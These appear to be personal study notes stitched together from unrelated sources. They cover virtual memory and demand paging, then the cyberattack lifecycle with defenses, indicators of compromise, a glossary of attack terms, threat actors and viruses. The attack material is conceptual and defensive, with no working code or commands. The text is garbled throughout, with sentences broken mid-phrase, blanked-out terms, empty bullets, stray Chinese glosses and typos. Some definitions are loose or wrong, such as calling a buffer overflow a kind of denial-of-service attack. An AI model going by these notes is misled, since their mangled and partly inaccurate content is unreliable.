abstracts main memory into an extremely large, uniform array of storage, separating logical memory as viewed by the programmer from physical memory.
frees programmers from the concerns of memory-storage limitations.
allows processes to share files and libraries, and to implement shared memory.
provides an efficient mechanism for process creation.
Virtual memory is not easy to implement, and may substantially decrease performance if it is used carelessly.
536CN4 chapter 10.1 Background
The memory-management algorithms outlined in Chapter 9 are necessary because of one basic requirement: the instructions being executed must be in physical memory.
The first approach: place entire logical address space in
physical memory.
Dynamic linking can help to ease this restriction, but it generally requires special precautions and extra work by the programmer.
Instructions must be in physical memory to be executed seems both necessary and reasonable; but it limits the size of a program to the size of physical memory. actually the entire program is not needed.
Programs often have code to handle unusual error conditions. Since these errors seldom, if ever, occur in practice, this code almost never executed.
Arrays, lists, and tables are often allocated more memory than they actually need. An array may be declared 100 by 100 elements, even though it is seldom larger than 10 by 10 elements.
Certain options and features of a program may be used rarely. For instance, the routines on U.S. government computers that balance the budget have not been used in many years.
Even the entire program is needed, not needed at the same time. Execute a program partially in memory would confer many benefits:
program no longer be constrained by available physical memory. Users would be able to write programs for an extremely large virtual address space, simplifying the programming task.
each program take less physical memory, more programs could be run at the same time, increase CPU utilization and throughput with no increase in response time or turnaround time.
Less I/O would be needed to load or swap portions of programs into memory, so each program would run faster.
benefit both the system and its users.
Virutal memory: the separation of logical memory as perceived by developers from physical memory. This separation allows an extremely large virtual memory to be provided for programmers when only a smaller physical memory is available.  The virtual address space of a process = the logical/virtual view of how a process is stored in memory.
Typically, process begins at a certain logical address (like address 0) and exists in contiguous memory, like Figure 10.2.  In fact physical memory is organized in page frames
the physical page frames assigned to a process may not be
contiguous.
up to the memory-management unit (MMU) to map logical
pages to physical page frames in memory.
 Note in Figure 10.2 that we allow the heap to grow upward in memory as it is used for dynamic memory allocation. Similarly, we allow for the stack to grow downward in memory through successive function calls.
virtual address space: large blank space/hole between the heap and the stack, but will require actual physical pages only if the heap or stack grows.  Virtual address spaces that include holes are known as sparse
address spaces. Using a sparse address space is beneficial because the holes can be filled as the stack or heap segments grow or if we wish to dynamically link libraries (or possibly other shared objects) during program execution.
 In addition to separating logical memory from physical memory,
virtual memory allows files and memory to be shared by two or more processes through page sharing. benefits:
System libraries such as the standard C library can be shared by several processes through mapping of the shared object into a virtual address space. Although each process considers the libraries to be part of its virtual address space, the actual pages where the libraries reside in physical memory are shared by all the processes. Typically, a library is mapped read-only into the space of each process that is linked with it.
processes can share memory. Recall from Chapter 3 that two or more processes can communicate through the use of shared memory. Virtual memory allows one process to create a region of memory that it can share with another process. Processes sharing this region consider it part of their virtual address space, yet the actual physical pages of memory are shared, much as is illustrated in Figure 10.3.
Pages can be shared during process creation with the fork() system call, thus speeding up process creation.
536CN4 chapter 10.2 Demand Paging
Consider how an executable program might be loaded from secondary storage into memory.
One option is to load the entire program in physical memory at program execution time. But may not initially need the entire program in memory.
a program starts with a list of available options for user to select. Loading the entire program into memory = loading the executable code for all options, regardless of whether or not an option is ultimately selected.
An alternative strategy is to load pages only as they are needed, demand paging, commonly used in virtual memory systems.
demand-paged virtual memory: pages are loaded only when they are demanded during program execution.
Pages never accessed are thus never loaded into physical memory.
demand-paging system, similar to paging system with swapping, where processes reside in secondary memory (usually an HDD or NVM device).
Demand paging explains one of the primary benefits of virtual memory: loading only the needed portions of programs, memory more efficiently.
536CN4 chapter 10.2.1 Basic Concepts
Demand paging: load a page in memory only when it is needed. while a process is executing, some pages will be in memory,
and some will be in secondary storage.
we need hardware support to distinguish between the two, the   - when the bit is set to “valid,” the associated page is both legal and in memory.
  - If the bit is set to “invalid,” the page either is not valid (not in the logical address space of the process) or is valid but is currently in secondary storage.
The page-table entry for a page that is brought into memory is set as usual, but the page-table entry for a page that is not currently in memory is simply marked invalid. This situation is depicted in Figure 10.4. (Notice that marking a page invalid will have no effect if the process never attempts to access that page.)  If the process tries to access a page that was not brought into memory?
Access to a page marked invalid will causes a page fault.
The paging hardware (translating the address through the page operating system. This trap is the result of the operating system’s failure to bring the desired page into memory.
The procedure for handling this page fault:
1. check an internal table (usually kept with the process control block), process determine the reference is valid or an invalid memory access.
2. If the reference was invalid, we terminate the process. If it was valid but we have not yet brought in that page, we now
 page it in.
3. We find a free frame (by taking one from the free-frame list, example).
4. We schedule a secondary storage operation to read the desired page into
the newly allocated frame.
5. When the storage read is complete, we modify the internal table kept with the process and the page table to indicate that the page is now in memory.
6. We restart the instruction that was interrupted by the trap. The process can now access the page as though it had always been in memory.
In the extreme case, we start executing a process with no pages in memory.
When the operating system sets the instruction pointer to the first instruction of the process, which is on a non-memory- resident page, the process immediately faults for the page.
After this page is brought into memory, the process continues to execute, faulting as necessary until every page that it needs is in memory. At that point, it can execute with no more faults.
This scheme is pure demand paging scheme: never bring a page into memory until it is required.
Theoretically, some programs could access several new pages of memory with each instruction execution (one page for the instruction and many for data), possibly causing multiple page faults per instruction. This situation would result in unacceptable system performance. Fortunately, analysis of running processes shows that this behavior is exceedingly unlikely. Programs tend to have locality of reference, described in Section 10.6.1, which results in reasonable performance from demand paging. The hardware to support demand paging is the same as the hardware for paging and swapping:
Page table. This table has the ability to mark an entry invalid through a valid–invalid bit or a special value of protection bits.
Secondary memory. This memory holds those pages that are not present in main memory. The secondary memory is usually a high-speed disk or NVM device. It is known as the swap device, and the section of storage used for this purpose is known as           . Swap- space allocation is discussed in Chapter 11.
A crucial requirement for demand paging is the ability to restart any instruction after a page fault. Because we save the state (registers, condi- tion code, instruction counter) of the interrupted process when the page fault occurs, we must be able to restart the process in exactly the same place and state, except that the desired page is now in memory and is accessible. In most cases, this requirement is easy to meet. A page fault may occur at any memory reference. If the page fault occurs on the instruction fetch, we can restart by fetching the instruction again. If a page fault occurs while we are fetching an operand, we must fetch and decode the instruction again and then fetch the operand.
As a worst-case example, consider a three-address instruction such as ADD the content of A to B, placing the result in C. These are the steps to execute this instruction:
   Fetch and decode the instruction (ADD).    Fetch A.
      
Fetch B.
Add A and B. Store the sum in C.
If we fault when we try to store in C (because C is in a page not currently in memory), we will have to get the desired page, bring it in, correct the page table, and restart the instruction. The restart will require fetching the instruction again, decoding it again, fetching the two operands again, and then adding again. However, there is not much repeated work (less than one complete instruction), and the repetition is necessary only when a page fault occurs.
The major difficulty arises when one instruction may modify several dif- ferent locations. example, consider the IBM System 360/370 MVC (move character) instruction, which can move up to 256 bytes from one location to another (possibly overlapping) location. If either block (source or destination) straddles a page boundary, a page fault might occur after the move is par- tially done. In addition, if the source and destination blocks overlap, the source block may have been modified, in which case we cannot simply restart the instruction.
This problem can be solved in two different ways. In one solution, the microcode computes and attempts to access both ends of both blocks. If a page fault is going to occur, it will happen at this step, before anything is modified. The move can then take place; we know that no page fault can occur, since all the relevant pages are in memory. The other solution uses temporary registers to hold the values of overwritten locations. If there is a page fault, all the old values are written back into memory before the trap occurs. This action restores memory to its state before the instruction was started, so that the instruction can be repeated.
This is by no means the only architectural problem resulting from adding paging to an existing architecture to allow demand paging, but it illustrates some of the difficulties involved. Paging is added between the CPU and the memory in a computer system. It should be entirely transparent to a process. Thus, people often assume that paging can be added to any system. Although this assumption is true for a non-demand-paging environment, where a page fault represents a fatal error, it is not true where a page fault means only that an additional page must be brought into memory and the process restarted. ### 6. Attack
Modern Cyberattack Strategy
 1. Reconnaissance 侦察或观测. plan their cyberattacks, research, identify, and select targets, often extracting public information from targeted employees’ social media profiles or from corporate websites, which can be useful for social engineering and phishing schemes. Attackers will also use various tools to scan for network vulnerabilities, services, and applications that they can exploit, such as:
- Network analyzers (packet analyzers, protocol analyzers, packet sniffers).
  - monitor and capture raw network traffic (packets).
  - Examples, tcpdump and Wireshark
- Network vulnerability scanners
  - typically consist of a suite of tools including password crackers, port scanners,
and vulnerability scanners and are used to probe a network for vulnerabilities
(including configuration errors) that can be exploited.
  - Examples include Nessus and SAINT.
- Port scanners
  - probe for open TCP / UDP / ICMP ports on an endpoint.
  - Examples include Nmap and Nessus.
- Password crackers
  - brute-force dictionary attacks against password hashes.
  - Examples include John the Ripper and THC Hydra.
- Web application vulnerability scanners
  - scan web applications for vulnerabilities such as cross-site scripting, SQL injection, and directory traversal.
  - Examples include Burp Suite and OWASP Zed Attack Proxy (ZAP).
- Wi-Fi vulnerability scanners
  - scan wireless networks for vulnerabilities (including open and misconfigured access points), to capture wireless network traffic, and to crack wireless passwords.
  - Examples include Aircrack-ng and Wifite.
         Breaking the Cyberattack Lifecycle at this phase
- proactive and effective enduser security awareness training that focuses on topics such as
social engineering techniques (for example, phishing, piggybacking, and shoulder surfing), social media (for example, safety and privacy issues), and organizational security policies (for example, password requirements, remote access, and physical security), continuous monitoring and inspection of network traffic flows to detect and prevent unauthorized port and vulnerability scans, host sweeps, and other suspicious activity.
Effective change and configuration management processes help ensure that newly deployed applications and endpoints are properly configured (for example, disabling unneeded ports and services) and maintained.
2. Weaponization. Next, attackers determine which methods to use to compromise a target endpoint.
- They may choose to embed intruder code within seemingly innocuous files such as a PDF or Microsoft Word document or email message.
- Or, for highly targeted attacks, attackers may customize deliverables to match the specific interests of an individual within the target organization.
Breaking the Cyberattack Lifecycle at this phase
- challenging because weaponization typically occurs within the attacker’s network.
- However, analysis of artifacts (both malware and weaponizer) can provide important
threat intelligence to enable effective zero-day protection when delivery (the next step) is attempted.
3. Delivery. Attackers next attempt to deliver their weaponized payload to a target endpoint,
- for example, via email, instant messaging (IM), drive-by download (an end user’s web
browser is redirected to a webpage that automatically downloads malware to the endpoint in the background), or infected file share.
Breaking the Cyberattack Lifecycle at this phase
- visibility into all network traffic (including remote and mobile devices) to effectively
block malicious or risky websites, applications, and IP addresses to prevent known and unknown malware and exploits.
4. Exploitation. After a weaponized payload is delivered to a target endpoint, it must be triggered. An end user may unwittingly trigger an exploit,
- for example, by clicking a malicious link or opening an infected attachment in an email, or an attacker may remotely trigger an exploit against a known server vulnerability on the target network.
 Breaking the Cyberattack Lifecycle at this phase
- as during the Reconnaissance phase, begins with proactive and effective end-user security
awareness training that focuses on topics such as malware prevention and email security
- vulnerability and patch management;
- malware detection and prevention;
- threat intelligence (including known and unknown threats);
- blocking risky, unauthorized, or unneeded applications and services;
- managing file or directory permissions and root or administrator privileges;
- logging and monitoring network activity.
5. Installation. Next, an attacker will escalate privileges on the compromised endpoint,
- for example, by establishing remote shell access and installing rootkits or other malware.
With remote shell access, the attacker has control of the endpoint and can execute commands in privileged mode from a commandline interface (CLI), as if physically sitting in front of the endpoint. The attacker will then move laterally across the target’s network, executing attack code, identifying other targets of opportunity, and compromising additional endpoints to establish persistence.
breaking the Cyberattack Lifecycle at this phase
- limit or restrict the attacker’s lateral movement within the network.
- Use network segmentation and a Zero Trust model that monitors and inspects all traffic
between zones or segments, and granular control of applications that are allowed on the network.
6. Command and control. Attackers establish encrypted communication channels back to command-andcontrol (C2) servers across the internet so that they can modify their attack objectives and methods as additional targets of opportunity are identified within the victim network, or to evade any new security countermeasures that the organization may attempt to deploy if attack artifacts are discovered.
Communication is essential to an attack because it enables the attacker to remotely direct the attack and execute the attack objectives. C2 traffic must therefore be resilient and stealthy for an attack to succeed. Attack communication traffic is usually hidden with various techniques and tools, including:
 - ◆
- ◆
◆
with SSL, SSH (Secure Shell), or other custom proprietary encryption.
陷害 via proxies, remote access tools, or tunneling. In some instances, use of cellular networks enables complete circumvention of the target network for attack C2 traffic.
Port evasion using network anonymizers or port hopping to traverse any available open
ports.
Fast Flux (or Dynamic DNS) to proxy through multiple infected endpoints or multiple
everchanging C2 servers to reroute traffic and make determination of the true destination or attack source difficult.
DNS tunneling is used for C2 communications, as well as data infiltration (for example,
 Encryption
 Circumvention
   sending malicious code, commands, or binary files to a victim) and data exfiltration.
breaking the Cyberattack Lifecycle at this phase
- inspection of all network traffic (including encrypted communications),
- blocking of outbound C2 communications with anti-C2 signatures (along with file and
data pattern uploads),
- blocking of all outbound communications to known malicious URLs and IP addresses,
- blocking of novel attack techniques that employ port evasion methods,
- prevention of the use of anonymizers and proxies on the network,
- monitoring of DNS for malicious domains and countering with DNS sinkholing or DNS
poisoning,
- and redirection of malicious outbound communications to honeypots to identify or block
compromised endpoints and analyze attack traffic.
7. Actions on the objective. Attackers often have multiple, different attack objectives including data theft; destruction or modification of critical systems, networks, and data; and denial-of- service (DoS).
- This last stage of the Cyberattack Lifecycle can also be used by an attacker to advance the early stages of the Cyberattack Lifecycle against another target. The 2018 Verizon Data Breach Investigations Report (DBIR) describes this strategy as a secondary motive in which “[web applications] are compromised to aid and abet in the attack of another victim.” For example, an attacker may compromise a company’s extranet to breach a business partner that is the primary target. According to the DBIR, in 2014 there were 23,244 “incidents where web applications were compromised with a secondary motive.” The attacker pivots the attack against the initial victim network to a different victim network, thus making the initial victim an unwitting accomplice.
INDICATORS OF COMPROMISE I
ndicators of compromise (IOCs) are “pieces of forensic data, such as data found in system log entries or files, that identify potentially malicious activity on a system or network.”
By monitoring for indicators of compromise, organizations can detect attacks and act quickly to prevent breaches from occurring or limit damages by stopping attacks in earlier stages. detecting data breaches, malware infections, or other threat activity. ▪


## Indicators of compromise act as breadcrumbs that lead infosec and IT pros to detect malicious activity early in the attack sequence. These unusual activities are the red flags that indicate a potential or in-progress attack that could lead to a data breach or systems compromise.
But, IOCs are not always easy to detect; they can be as simple as metadata elements or incredibly complex malicious code and content samples.
Analysts often identify various IOCs to look for correlation and piece them together to analyze a potential threat or incident.
INDICATORS OF COMPROMISE VS. INDICATORS OF ATTACK Indicators of compromise:
focusing on forensic analysis of a compromise that has already taken place
“What happened?” indicators of attack:
focus on identifying attacker activity while an attack is in process.
“What is happening and why?”
A proactive approach to detection uses both IOAs and IOCs to discover security incidents or threats in as close to real time as
   ▪


## possible.
EXAMPLES OF INDICATORS OF COMPROMISE
There are several indicators of compromise that organizations should monitor. In an article for DarkReading, Ericka Chickowski highlights 15 key indicators of compromise:
Unusual Outbound Network Traffic: monitor all activity on your network - both inbound and outbound.
Anomalies in Privileged User Account Activity: They will
usually do this by leapfrogging onto accounts with administrative privileges or by escalating the permissions on accounts they already have access to. Changes in account activity, such as the volume of information accessed or altered or the type of system accessed are good IoCs to monitor.
Geographical Irregularities
Log-In Red Flags
Increases in Database Read Volume: A spike in database read volume is a good indicator that an attacker is
attempting to infiltrate your data.
HTML Response Sizes
Large Numbers of Requests for the Same File Mismatched Port-Application Traffic Suspicious Registry or System File Changes
         ▪


##  Unusual DNS Requests Unexpected Patching of Systems Mobile Device Profile Changes Bundles of Data in the Wrong Place Web Traffic with Unhuman Behavior Signs of DDoS Activity
USING INDICATORS OF COMPROMISE TO IMPROVE DETECTION AND RESPONSE
Monitoring for indicators of compromise enables organizations to better detect and respond to security compromises. Collecting and correlating IOCs in real time means that organizations can more quickly identify security incidents that may have gone undetected by other tools and provides the necessary resources to perform forensic analysis of incidents. If security teams discover recurrence or patterns of specific IOCs they can update their security tools and policies to protect against future attacks as well. There is a push for organizations to report these analyses results in a consistent, well-structured manner to help companies and IT professionals automate the processes used in detecting, preventing, and reporting security incidents. Some in the industry argue that documenting IOCs and threats helps organizations and individuals share information among the IT community as well as improve incident response and computer forensics. The OpenIOC framework is one way to consistently describe the results of malware analysis.
Other groups such as STIX and TAXII are making efforts to
     standardize IOC documentation and reporting. Indicators of compromise are an important component in the battle against malware and cyberattacks. While they are reactive in nature, organizations that monitor for IOCs diligently and keep up with the latest IOC discoveries and reporting can improve detection rates and response times significantly.
Threat and Attack Terminology
Address Resolution Protocol (ARP): to map known IP addresses to unknown physical addresses.
Address Resolution Protocol (ARP) poisoning: An attack that convinces the network that the attacker’s MAC (Media Access Control) address is the one associated with an allowed address so that traffic is wrongly sent to attacker’s address.
Adware: Software that gathers information to pass on to marketers, intercepts personal data, makes it available to third parties.
antivirus software: Software that identifies, remove or quarantine the virus.
armored virus: virus protected, “armored” against antivirus programs, makes difficult to
disassemble it, getting to, understand, its code.
ARP spoofing/poisoning: involves the MAC (Media Access Control) address of the data being faked.
Attack: Any unauthorized intrusion into the normal operations of a computer or network. attack surface: The area of an application that is available to authenticated users and those
who are not.
attack surface reduction (ASR): Minimizing the possibility of exploitation by reducing the
amount of code and limiting potential damage.
Backdoor: An opening left in a program application (usually by the developer) that allows additional access to data. Typically, a backdoor is created for debugging purposes and is not documented. Before the product ships, the backdoors are closed; when they aren’t closed, security loopholes exist.   - Malicious form, compromised computer being controlled remotely. buffer overflow:
  - A type of denial-of-service (DoS) attack
  - put more data into a buffer than it can hold, overflowing it.
Clickjacking: Using multiple transparent/opaque layers to trick a user into clicking button/
link on another page when they had intended to click on the top page.
companion virus: virus that creates a new program that runs in the place of an expected
program with same name.
cross-site request forgery (XSRF):
  - A form of web-based attack
  - unauthorized commands are sent from a user that a website trusts. cross-site scripting (XSS):
  - Running a script routine on a user’s machine from a website without their permission.
denial-of-service (DoS): attack that prevents any users from using a system. dictionary attack: crack passwords by testing them against a list of dictionary words. distributed denial-of-service (DDoS):
  - A derivative of a DoS attack
  - multiple hosts in multiple locations all focus on one target to reduce its
availability to the public.
  - Through the use of compromised systems, botnets, and other means.
DNS poisoning: attack method in which a daemon caches DNS reply packets, which sometimes contain other information (data used to fill the packets). The extra data can be scanned for information useful in a break-in or man-in-the-middle attack.
DNS spoofing: DNS server is given information about a server that it thinks is legitimate when it isn’t.
Domain Name System (DNS): network service used in TCP/IP networks, translates hostnames to IP addresses. integer overflow: Too much information into small space that has been set aside for numbers. IP spoofing: Making the data look like it came from trusted host when it didn’t (spoofing the
IP address of the sending host).
least privilege: A permission method, users are granted only the privileges necessary to perform their job function.
least privilege policy: The policy of giving a user only the minimum permissions needed to do the work that must be done.
logic bomb:
  - code hidden in an application and causes things unexpected to happen based on some criteria being met.
  - Example, a programmer could create a program that always makes sure her name appears on the payroll roster; if it doesn’t, then key files begin to be erased.
macro virus: software exploitation virus, using the macro feature included in many app, like Microsoft Office.
malicious code Any code that is meant to do harm.
malicious insider threat A threat from someone inside the organization intent on doing harm.
man-in-the-middle or TCP/IP hijacking: attack, someone/something that is trusted intercepts packets and retransmits them to another party. .
multipartite virus: virus that attacks a system in more than one way.
password attacks: Attempting to ascertain a password that you should not know.
Phage 噬菌体 virus: virus, modifies and alters other programs and databases. ping of death
  - A large Internet Control Message Protocol (ICMP) packet sent to overflow the remote host’s buffer.
  - usually causes the remote host to reboot or hang. Polymorphic 多形态的:
  - An attribute of viruses that mutate 突变 and appear differently each time they crop up.   - The mutations make it harder for virus scanners to detect/react to the viruses. privilege escalation:
  - The result when user obtains access to resource that they wouldn’t be able to access.
  - can be done:
  - inadvertently by running a program with Set User ID (SUID) or Set Group ID
(SGID) permissions
  - temporarily becoming another user (su or sudo in Unix/Linux or RunAs in Windows).
  - purposefully by an attacker seeking full access.
Ransomware 勒索 : Software, demands payment before restoring the data or system
infected.
replay attack: attack, captures portions of a session, play back later to convince a host that it
is still talking to the original connection.
Retrovirus: virus, attacks or bypasses the antivirus software installed on a computer.
Rogueware 流氓软件 : A form of malware, try to convince the user to pay for a fake threat. Rootkit: Software program, can obtain root-level access and hide certain things from the
operating system.
Scareware 假冒安全软件 : Software, try to convince unsuspecting users that a threat exists.
Shim: A small library, created to intercept API calls transparently.
Spoofing: An attempt to masquerade as someone/something else.
Spyware: Software programs that work—often actively—on behalf of a third party.
Stealth ⻤祟 virus: virus, to avoid detection by masking itself from applications. Trojan horse:
  - Any application
  - masquerades as one thing in order to get past scrutiny, does something malicious.
  - Major differences between Trojan horses, viruses: Trojan horses tend not to
   replicate themselves.
typo squatting: Creating domains, based on the misspelling of another.
URL hijacking: Registering domains that are similar, based on a misspelling or typographical error.
Virus: A program intended to damage a computer system.
watering hole attack: Identifying a site that is visited by target, poisoning that site, waiting
for the results.
zero-day exploit: An attack that begins the very day an exploit is discovered. Zombie: system, taking directions from a master control computer.
  - often used in distributed denial-of-service (DDoS) and botnet attacks.
Living in a World of Viruses
Under the best of circumstances, a virus may: do nothing more than reside on the computer, damage the data on your storage devices destroy your operating system
possibly spread to other systems.
Viruses get into your computer in one of three ways: On contaminated media (DVD, USB drive, or other) Through email and social networking sites
As part of another program
 Xmas attack: An advanced attack, try to get around detection and send a packet with every single option enabled. Symptoms of a Virus Infection
look for symptoms when determining if a virus infection has occurred: The programs start to load more slowly.
  - This happens because the virus is spreading to other files in your system or is taking over system resources.
Unusual files appear, or files start to disappear from your system.
  - Many viruses delete key files in your system to render it inoperable.
Program sizes change from the installed versions.
  - virus is attaching itself to these programs on your disk.
browser, word processing application, or other software begins to exhibit unusual operating characteristics. Screens or menus may change.
The system mysteriously shuts itself down, starts itself up, does unanticipated disk activity.
mysteriously lose access to a disk drive or other system resources.
  - The virus has changed the settings on a device to make it unusable.
System suddenly doesn’t reboot, gives unexpected error messages during startup. ...
How Viruses Work
A virus, in most cases, tries to accomplish one of two things:
render your system inoperable
or spread to other systems.
Many viruses will spread to other systems given the chance and then render your system unusable. This is common with many of the newer viruses.
If your system is infected, the virus may try to attach itself to every file in your system and spread each time you send a file or document to other users.
  ThreatActors
When considering attacks, it’s important to realize that there are several different types of threat actors, and they each have different attributes. Don’t let the phrase threat actors confuse you. It’s just a fancier name given to attackers—anyone who launches a cyberattack on others.
One common method that attackers often use before launching an attack is to gather information from open-source intelligence:
- includes any information that is available via web sites and social media. - example, if attackers want to get the name of the chief executive officer (CEO) of a company, they can probably find it on the company’s web site.
- Similarly, many organizations post information on social media sites such as Facebook and Twitter.
Example:
- script kiddie
- hacktivist
- Insider
- Competitors
- Organized crime:
- advanced persistent threat (APT):
script kiddie
- attacker uses existing computer scripts or code to launch attacks.
- have very little expertise or sophistication, very little funding.
- Motivations: vary, boredom, or just to see what they can do. for fun
hacktivist
- launches attacks as part of an activist movement or to further a cause.
- Motivations: not for their own benefit, but increase awareness about a cause. Hocus on attacks that cause widesoreak disruption as opposed to financial gain.
- Example, Deric Lostutter (known online as KYAnonymous) was upset about the rape of a Steubenville, Ohio, high school girl, and what he perceived as a lack of justice. He later admitted to participating in several efforts to raise awareness of the case, including targeting a web site ran by one of the high school’s football players. Eventually, two high school football players were convicted of the rape. One was sentenced to a year in juvenile detention and served about 10 months. The other one was sentenced to two years and served about 20 months. Lostutter was ultimately sentenced to two years in federal prison.
Insider
- anyone has legitimate access to an organization’s internal resources.
- The extent of the threat depends on how much access the insider has.
  - They may steal files that include valuable data, install or run malicious scripts, or redirect funds to their personal accounts.
- Motivations: greed, exact revenge Competitors
- Motivations: not money, but gain proprietary information about another company.
Organized crime
- an enterprise that employs a group of individuals working together in criminal activities.
- Motivations: money.
  - Almost all their efforts can be traced back to greed with the goal of
getting more money, regardless of how they get it.
  - However, because there isn’t a defined size for organized crime, their sophistication, resources, and motivations can vary widely.
  - Imagine a group of 10 individuals decides to target a single company. They will probably have significantly less sophistication and resources than the criminals within Butterfly.
advanced persistent threat (APT)
- Some attackers are organized and sponsored by a nation-state or government. - a targeted attack against a network.
- launched by a group that has both the capability and intent to launch sophisticated and targeted attacks.
- They often have a significant amount of resources and funding.
- Additionally, individuals within an APT group typically have very specific targets, such as a specific company, organization, or government agency.
- Successfulattacksoftenallow unauthorized access for long periods oftime, allowing attacks to exfiltrate a significant amount of data.
example, Mandiant concluded that the group they named APT1 operates as Unit 61398 of the People’s Liberation Army (PLA) inside China. Mandiant estimates that APT1 includes over 1,000 servers and between dozens and hundreds of individual operators and has:
- Released at least 40 different families of malware
- Stolen hundreds of terabytes of data from at least 141 organizations
- Maintained access to some victim networks for over four years before being detected
- Established footholds within many networks after email recipients opened malicious files that installed backdoors, allowing attackers remote access
- Chinese officials have denied these claims.
More recently, the U.S. Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) released a joint analysis report (JAR-16-20296A), named GRIZZLY STEPPE, that provides detailed information on these APTs. They are nicknamed Fancy Bear (APT 28) and Cozy Bear (APT 29). The joint report states that these groups have targeted many government organizations, think tanks, universities, and corporations around the world. GRIZZLY STEPPE also indicates these two APTs compromised and exploited networks associated with the 2016 U.S. presidential election. Cybersecurity firms such as CrowdStrike, SecureWorks, ThreatConnect, and FireEye’s Mandiant have all indicated that APT 28 is sponsored by the Russian government and has probably been operating since the mid-2000s. Similarly, CrowdStrike has suggested that APT 29 is associated with Russian agencies. Symantec believes the organization has been attacking government and diplomatic organizations since at least 2010.
Russian officials have denied these claims.
1.3 Threats and Attacks
- threats and attacks that compromise these goals:
- Eavesdropping: (attack on confidentiality)
◦ Intercept information during transmission over a communication channel.
◦ Examples: packet sniffers
- Alteration: (attack on data integrity)
◦ unauthorized modification of information.
◦ Examples: man-in-the-middle attack
- Denial-of-service: (attack on availability)
◦ the interruption/degradation of a data service or information access.
◦ Examples: email spam
- Masquerading: 伪装物 (attack on authenticity)
◦ the fabrication of information, purported to be from someone who
is not actually the author.
◦ Examples: phishing网络仿冒
- Repudiation: (attack on assurance)
◦ the denial of a commitment or data receipt.
◦ attempt to back out of a contract or a protocol that requires the
different parties to provide receipts acknowledging that data
has been received.
- Correlation and traceback: (attack on anonymity)
◦ the integration of multiple data sources and information flows to
determine the source of a particular data stream or piece of information.
- attack on anonymity
- phishing 网络仿冒: ◦ ◦
4.2 Computer Viruses
A computer virus, or simply virus, is computer code that can replicate itself by modifying other files or programs to insert code that is capable of further replication. This self-replication property is what distinguishes computer viruses from other kinds of malware, such as logic bombs. Another distin- guishing property of a virus is that replication requires some type of user assistance, such as clicking on an email attachment or sharing a USB drive. Often, a computer virus will perform some malicious task as well, such as deleting important files or stealing passwords.
Computer viruses share a number of properties with biological viruses. When released, biological viruses use their environment to spread to unin- fected cells. A virus can often lie dormant for a period of time, waiting until it encounters the right kind of uninfected cell. When a virus encounters such a cell, it attacks that cell’s defenses at the margins. If it is able to penetrate the cell, the virus uses the cell’s own reproductive processes to make copies of the virus instead, which eventually are released from the cell in great numbers, so as to repeat the process. (See Figure 3.) In this way, computer viruses mimic biological viruses, and we even use the biological term vectors to refer to vulnerabilities that malware, such as computer viruses, exploit to perform their attacks.
4.2.2 Defenses Against Viruses
creates a web site that looks like a real bank or other e-commerce site,
intended only for gathering passwords, and spoofing, which may involve sending on a network data packets that have false
return addresses.
◦ Virus Signatures
Experts study the infected files, looking for code fragments that are unique to this particular computer virus, constructing a character string that uniquely identifies this virus.
This character string is known as a signature for the virus. a virus detection program load up the signatures of all known viruses.
Virus detection software packages have to be frequently updated, using the most up-to-date database of virus signatures.
Detect the presence of a virus signature in a file is an instance of a pattern-matching problem, finding a search pattern in a text.
  - Several efficient pattern matching algorithms have been devised, which are able to search for multiple patterns concurrently in a single scan of the file.
Virus Detection and Quarantine
Checking files for viruses can be done either by periodic scans of the entire file system or, more effectively, in real time by examining each newly cre- ated or modified file and each email attachment received. Real-time virus checking relies on intercepting system calls associated with file operations so that a file is scanned before it is written to disk. Any file that contains a part that matches a virus signature will be set aside into protected storage, known as a quarantine. The programs put into quarantine can then be examined more closely to determine what should be done next. For ex- ample, a quarantined program might be deleted, replaced with its original (uninfected) version, or, in some cases, it might be directly modified to remove the virus code fragments (in a process not unlike surgery).
Viruses computer virus:
a type of malware
propagates by inserting a copy of itself into and becoming part of another program.
spreads from one computer to another, leaving infections as it travels. can range in severity from causing mildly annoying effects to damaging
data or software and causing denial-of-service (DoS) conditions.
Almost all viruses are attached to an .exe file, which means the virus may exist on a system but will not be active or able to spread until a user runs or opens the malicious host file or program.
  - When the host code is executed, the viral code is executed as well. Normally, the host program keeps functioning after it is infected by the virus.
  - However, some viruses overwrite other programs with copies of themselves, which destroys the host program altogether.
  - Viruses spread when the software or document they are attached to is transferred from one computer to another using the network, a disk, file sharing, or infected email attachments.
Network-based attack
Remote exploit: take full control of a vulmerable host.
Remaining Attacks
Have you ever been on a really long road trip? You know the ones I’m talking about, right? When you leave, you’re really excited, and the miles just seem to pass along happily. Then, somewhere along the way, things change. The excitement dies down, and before you know it, the miles become a burden instead of a joy. Everything seems like it takes forever, and the road becomes the enemy, with each road sign mocking your progress instead of marking it. Then, just as things are near their worst, you see the sign with your destination listed on it. It might read 200 miles, it might read 500, but instantly your spirits are lifted.
Have you noticed that at that point you start driving faster? Do you know why? Because you can see the end from there. Once the destination is within reach, once you can see that proverbial light at the end of the tunnel, your natural instinct is to sprint. There’s no need for bathroom breaks—no need to stop and look at the world’s largest ball of twine—because you are so close to the end you just want to get there and rest. It’s perfectly natural, and it’s the way our minds work.
Well, dear reader, we both find ourselves at an interesting juncture here. You and I have been on a long journey so far. It started out exciting, and there was a lot to look at and pass the time with. Now we’re close to the end (you’ve no doubt looked at the table of contents and know where we are), and you’re tired of reading. Heck, I’m tired of writing, and the temptation for both of us is to sprint—to blast through the rest and just finish, for goodness’ sake. Trust me, though, we’ve got just two big points to get through here. I’ll keep them short and to the point, but I’ll need to know you’re willing to do your part and stick with me. Come on, we’re almost there.
NOTE Arctic safety briefings will tell you many people who were found frozen to death were found on the edge of visual contact with a destination that could provide safety. The theory goes that people were so distressed from hypothermia that the sight of safety caused them to either collapse or stop to rest for a moment, resulting in an inability to go further. That’s not a testable item, but it fits with the allegory here. As an aside, many were found without coats. It turns out severe hypothermia is known to make you feel warm before you freeze. And you thought this book would be boring. Denial of Service
We’ve already defined a denial-of-service attack and a distributed denial-of-service attack, but this section is here to go into a little more detail (namely because there are CEH objectives yet to cover on the subject, and ECC has devoted an entire chapter to DoS). For example, you may or may not be aware that a DoS is generally thought of as a last-resort attack. This isn’t always true—there are plenty of examples where DoS was the whole point. In some cases, the attacker just wants to embarrass the target or maybe prevent the spread of information. But, sometimes, when a hacker is tired of trying to break through your defenses, she may simply resort to “blowing it up” out of frustration.
